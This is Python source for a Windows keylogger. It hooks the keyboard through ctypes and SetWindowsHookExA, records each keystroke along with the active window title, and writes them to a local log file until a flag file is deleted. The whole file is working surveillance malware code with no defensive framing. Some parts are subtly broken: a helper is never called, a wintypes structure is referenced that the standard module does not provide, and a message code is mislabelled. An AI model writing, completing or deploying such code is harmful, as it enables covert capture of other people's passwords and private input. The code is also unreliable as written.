import os
import time
import ctypes
import logging
import threading
import signal
from ctypes import wintypes

logging.basicConfig(filename='keylogger.log', level=logging.DEBUG, format='%(message)s')

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi
current_window = None
toKey = {
    8: '[BACKSPACE]',
    13: '[ENTER]',
    32: ' ',
    9: '[TAB]',
    16: '[SHIFT]',
    17: '[CTRL]',
    18: '[ALT]',
    20: '[CAPSLOCK]',
    27: '[ESC]',
    33: '[PAGEUP]',
    34: '[PAGEDOWN]',
    35: '[END]',
    36: '[HOME]',
    37: '[LEFT]',
    38: '[UP]',
    39: '[RIGHT]',
    40: '[DOWN]',
    44: '[PRINTSCREEN]',
    45: '[INSERT]',
    46: '[DELETE]',
    91: '[LWIN]',
    92: '[RWIN]',
    93: '[APP]',
    144: '[NUMLOCK]',
    145: '[SCROLLLOCK]',
    160: '[LSHIFT]',
    161: '[RSHIFT]',
    162: '[LCTRL]',
    163: '[RCTRL]',
    164: '[LALT]',
    165: '[RALT]',
    65: 'A', 66: 'B', 67: 'C', 68: 'D', 69: 'E', 70: 'F', 71: 'G', 72: 'H', 73: 'I', 74: 'J', 75: 'K', 76: 'L', 77: 'M',
    78: 'N', 79: 'O', 80: 'P', 81: 'Q', 82: 'R', 83: 'S', 84: 'T', 85: 'U', 86: 'V', 87: 'W', 88: 'X', 89: 'Y', 90: 'Z',
    48: '0', 49: '1', 50: '2', 51: '3', 52: '4', 53: '5', 54: '6', 55: '7', 56: '8', 57: '9'
}

def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    process_id = pid.value
    executable = ctypes.create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, process_id)
    psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)
    window_title = ctypes.create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)
    logging.info("\n\n[Window: {} - at {}] ".format(window_title.value.decode('utf-8'), time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(nCode, wParam, lParam):
    global current_window
    if nCode >= 0:
        if wParam == 256 or wParam == 257:  # WM_KEYDOWN or WM_SYSKEYDOWN
            vkCode = ctypes.cast(lParam, ctypes.POINTER(wintypes.KBDLLHOOKSTRUCT)).contents.vkCode
            if vkCode in toKey:
                logging.info(toKey[vkCode])
            else:
                logging.info("[{}]".format(toKey.get(vkCode, 'Unknown')))
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

# Define the function type for the callback
KeyStrokeType = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)

def run(**args):
    hm = user32.SetWindowsHookExA(13, KeyStrokeType(KeyStroke), kernel32.GetModuleHandleW(None), 0)
    if hm == 0:
        logging.error("Failed to install hook.")
    msg = wintypes.MSG()
    while os.path.exists('keylogger.flag'):
        if user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageA(ctypes.byref(msg))
        else:
            user32.UnhookWindowsHookEx(hm)
            break



def start():
    global t
    t = threading.Thread(target=run)
    t.start()

def signal_handler(sig, frame):
    os.remove('keylogger.flag')
    t.join()
    exit()

if __name__ == "__main__":
    with open('keylogger.flag', 'w') as f:
        f.write('running')
    signal.signal(signal.SIGINT, signal_handler)
    start()
